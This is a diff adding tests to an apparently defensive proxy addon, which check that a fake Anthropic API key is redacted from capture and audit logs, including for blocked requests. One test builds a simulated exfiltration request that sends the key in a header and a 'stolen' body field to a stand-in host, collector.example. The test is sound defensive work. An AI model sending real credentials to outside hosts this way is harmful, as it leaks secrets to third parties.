@@ -440,3 +440,200 @@ def test_redact_request_round_trip_through_addon_response(tmp_path):
     )
     assert _FAKE_REAL.encode() not in flow.request.content
     assert b"{{ANTHROPIC_API_KEY}}" in flow.request.content
+
+
+# ── Blocked requests: the capture never holds a literal secret ──
+
+
+def _serializable_block_response(monkeypatch):
+    """Make the addon's synthesized 403 a response the capture writer can
+    serialize (the conftest stub's ``http.Response.make`` returns a
+    MagicMock, which is not JSON). Patched through the globals of the
+    module ``Agentcage`` was defined in: other test modules re-import
+    ``addon``, so ``sys.modules["addon"]`` may be a different copy."""
+    addon_http = Agentcage.request.__globals__["http"]
+
+    def make(status, content=b"", headers=None):
+        resp = MagicMock()
+        resp.status_code = status
+        resp.reason = "Forbidden"
+        resp.http_version = "HTTP/1.1"
+        resp.headers = _Headers(dict(headers or {}))
+        resp.content = content
+        return resp
+
+    monkeypatch.setattr(addon_http.Response, "make", make)
+
+
+def _audit_entries(tmp_path) -> list[dict]:
+    path = tmp_path / "audit.jsonl"
+    return [json.loads(line) for line in path.read_text().splitlines()]
+
+
+def _request_header(entry: dict, view: str, name: str) -> str:
+    return next(
+        v for k, v in entry[view]["request"]["headers"]
+        if k.lower() == name
+    )
+
+
+def test_blocked_literal_secret_is_redacted_in_every_capture_view(
+        tmp_path, monkeypatch):
+    """The cage sends the real value itself, to a host outside the rule's
+    ``inject_to``: the policy check blocks the request. The capture entry
+    for it must not hold the value in any view (the inbound view is the
+    one ``cage har`` presents as shareable): the rule's placeholder
+    stands in its place, as for a WebSocket frame blocked the same way.
+    The audit entry still records the block and its reason."""
+    _serializable_block_response(monkeypatch)
+    rule = InjectionRule(
+        name="ANTHROPIC_API_KEY",
+        placeholder="{{ANTHROPIC_API_KEY}}",
+        real_value=_FAKE_REAL,
+        inject_to=["anthropic.com"],
+    )
+    addon = _build_addon_with_capture(tmp_path, rules=[rule])
+
+    flow = _make_flow(
+        url="https://collector.example/upload",
+        host="collector.example",
+        headers={"X-Api-Key": _FAKE_REAL},
+        body=f'{{"stolen": "{_FAKE_REAL}"}}',
+    )
+    asyncio.run(addon.request(flow))
+    assert flow.metadata.get("agentcage_blocked") is True
+    addon._audit_file.flush()
+
+    cap_text = (tmp_path / "capture.jsonl").read_text()
+    assert _FAKE_REAL not in cap_text, (
+        f"blocked request leaked a literal secret into capture.jsonl: "
+        f"{cap_text[:500]!r}..."
+    )
+    [entry] = [json.loads(line) for line in cap_text.splitlines()]
+    assert entry["decision"] == "blocked"
+    for view in ("inbound", "outbound"):
+        assert entry[view]["request"]["body"] == (
+            '{"stolen": "{{ANTHROPIC_API_KEY}}"}'
+        )
+        assert _request_header(entry, view, "x-api-key") == (
+            "{{ANTHROPIC_API_KEY}}"
+        )
+
+    [audit] = _audit_entries(tmp_path)
+    assert audit["decision"] == "blocked"
+    assert audit["reason"] == (
+        "literal secret value ANTHROPIC_API_KEY found in outbound request "
+        "to collector.example"
+    )
+
+
+def test_literal_secret_to_inject_to_host_is_redacted_in_inbound_view(
+        tmp_path):
+    """A static rule's real value sent by the cage itself to a host in
+    its ``inject_to`` is allowed (it is the credential the egress would
+    inject there anyway). The inbound view is still the shareable one,
+    so it shows the placeholder, as the outbound view does."""
+    rule = InjectionRule(
+        name="ANTHROPIC_API_KEY",
+        placeholder="{{ANTHROPIC_API_KEY}}",
+        real_value=_FAKE_REAL,
+        inject_to=["anthropic.com"],
+    )
+    addon = _build_addon_with_capture(tmp_path, rules=[rule])
+
+    flow = _make_flow(headers={"x-api-key": _FAKE_REAL})
+    asyncio.run(addon.request(flow))
+    assert not flow.metadata.get("agentcage_blocked")
+    # On the wire: the value the cage sent, unchanged.
+    assert flow.request.headers["x-api-key"] == _FAKE_REAL
+
+    _attach_response(flow)
+    asyncio.run(addon.response(flow))
+
+    cap_text = (tmp_path / "capture.jsonl").read_text()
+    assert _FAKE_REAL not in cap_text
+    [entry] = [json.loads(line) for line in cap_text.splitlines()]
+    for view in ("inbound", "outbound"):
+        assert _request_header(entry, view, "x-api-key") == (
+            "{{ANTHROPIC_API_KEY}}"
+        )
+
+
+def test_response_blocked_flow_is_redacted_in_inbound_view(
+        tmp_path, monkeypatch):
+    """A request blocked at the response stage (a response inspector
+    said block) is captured with the staged request snapshots. The
+    inbound one must be redacted like the outbound one, whatever the
+    cage put in the request."""
+    addon_globals = Agentcage.response.__globals__
+
+    _serializable_block_response(monkeypatch)
+    rule = InjectionRule(
+        name="ANTHROPIC_API_KEY",
+        placeholder="{{ANTHROPIC_API_KEY}}",
+        real_value=_FAKE_REAL,
+        inject_to=["anthropic.com"],
+    )
+    addon = _build_addon_with_capture(tmp_path, rules=[rule])
+
+    flow = _make_flow(headers={"x-api-key": _FAKE_REAL})
+    asyncio.run(addon.request(flow))
+    assert not flow.metadata.get("agentcage_blocked")
+
+    async def block_responses(inspectors, ctx, *, method, skip=None):  # noqa: ARG001
+        if method != "response":
+            return []
+        return [addon_globals["InspectionResult"](
+            inspector="response-blocker", action="block",
+            reason="blocked for the test", severity="error",
+        )]
+
+    monkeypatch.setitem(addon_globals, "run_inspector_chain", block_responses)
+    _attach_response(flow)
+    asyncio.run(addon.response(flow))
+
+    cap_text = (tmp_path / "capture.jsonl").read_text()
+    assert _FAKE_REAL not in cap_text
+    [entry] = [json.loads(line) for line in cap_text.splitlines()]
+    assert entry["decision"] == "blocked"
+    for view in ("inbound", "outbound"):
+        assert _request_header(entry, view, "x-api-key") == (
+            "{{ANTHROPIC_API_KEY}}"
+        )
+
+
+def test_url_injected_secret_not_in_capture_path(tmp_path):
+    """A rule that injects into the URL (``inject_body``) puts the real
+    value in the request path on the wire. The capture entry's ``path``
+    field must show the placeholder, like its request snapshots."""
+    from urllib.parse import urlsplit
+
+    rule = InjectionRule(
+        name="ANTHROPIC_API_KEY",
+        placeholder="{{ANTHROPIC_API_KEY}}",
+        real_value=_FAKE_REAL,
+        inject_to=["anthropic.com"],
+        inject_body=True,
+    )
+    addon = _build_addon_with_capture(tmp_path, rules=[rule])
+
+    flow = _make_flow(
+        url="https://api.anthropic.com/v1/messages?key={{ANTHROPIC_API_KEY}}",
+    )
+    # As on a real request, the path follows the URL.
+    type(flow.request).path = property(
+        lambda self: (
+            urlsplit(self.url).path + "?" + urlsplit(self.url).query
+        )
+    )
+    asyncio.run(addon.request(flow))
+    # On the wire: the real value, in the path.
+    assert _FAKE_REAL in flow.request.path
+
+    _attach_response(flow)
+    asyncio.run(addon.response(flow))
+
+    cap_text = (tmp_path / "capture.jsonl").read_text()
+    assert _FAKE_REAL not in cap_text
+    [entry] = [json.loads(line) for line in cap_text.splitlines()]
+    assert entry["path"] == "/v1/messages?key={{ANTHROPIC_API_KEY}}"
